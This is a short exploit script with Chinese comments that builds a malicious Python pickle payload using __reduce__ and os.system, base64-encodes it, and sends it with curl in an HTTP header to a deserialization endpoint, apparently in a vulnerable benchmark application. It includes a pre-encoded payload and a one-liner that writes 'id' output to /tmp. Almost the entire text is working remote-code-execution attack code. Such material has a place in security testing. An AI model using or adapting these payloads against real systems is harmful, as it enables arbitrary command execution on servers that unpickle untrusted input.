# 构造恶意pickle载荷并发送（Python脚本）
python3 -c "
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('YOUR_COMMAND_HERE',))

payload = pickle.dumps(RCE())
encoded = base64.urlsafe_b64encode(payload).decode()
print(f'Payload: {encoded}')
"

# 发送请求（示例：执行 id > /tmp/pwned）
curl -X POST 'http://<TARGET>:8443/benchmark/deserialization-00/BenchmarkTest00510' \
  -H 'BenchmarkTest00510: gASVMQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBZpZCA-IC90bXAvcHduZWRfcGlja2xllIWUUpQu'

# 简易One-liner验证
python3 -c "
import pickle,base64,os
class X:__reduce__=lambda s:(os.system,('id>/tmp/pwned',))
print(base64.urlsafe_b64encode(pickle.dumps(X())).decode())
" | xargs -I{} curl -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00510' -H 'BenchmarkTest00510: {}'